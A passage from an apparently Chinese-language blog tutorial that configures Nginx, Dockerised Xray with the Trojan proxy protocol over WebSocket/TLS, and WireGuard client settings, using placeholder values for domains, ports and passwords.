prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>接下来在 <code>/etc/nginx/conf.d</code> 目录下创建一个新的配置文件 <code>自己想名字.conf</code> ，写入如下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/你的自定义网页路径;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /和xray配置相同的你的自定义路径 &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                &#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:和xray配置相同的你的自定义本地监听端口，例如11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://你自己的域名/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><h3 id="3️⃣-配置-XRAY-Trojan-代理"><a href="#3️⃣-配置-XRAY-Trojan-代理" class="headerlink" title="3️⃣ 配置 XRAY Trojan 代理"></a>3️⃣ 配置 XRAY Trojan 代理</h3><p>直接上 Docker：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">11451</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>配置文件 <code>config.json</code> 这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;sendThrough&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;redirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:WireGuard的本地监听端口&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>构建运行，这里直接让容器使用本地网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><h2 id="内网客户端配置"><a href="#内网客户端配置" class="headerlink" title="内网客户端配置"></a>内网客户端配置</h2><h3 id="1️⃣-配置-WireGuard-1"><a href="#1️⃣-配置-WireGuard-1" class="headerlink" title="1️⃣ 配置 WireGuard"></a>1️⃣ 配置 WireGuard</h3><p>和前面基本一致，其他不再赘叙，不过配置文件修改如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端生成的私钥<br><span class="hljs-attr">Address</span> = 上面配置的客户端地址<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端的公钥<br><span class="hljs-attr">Endpoint</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:xray监听的本地端口<br><span class="hljs-attr">AllowedIPs</span> = 服务端网段，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="2️⃣-配置-xray"><a href="#2️⃣-配置-xray" class="headerlink" title="2️⃣ 配置 xray"></a>2️⃣ 配置 xray</h3><p>直接上 Docker：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>配置文件 <code>config.json</code> 这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;wireguard&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dokodemo-door&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;followRedirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span 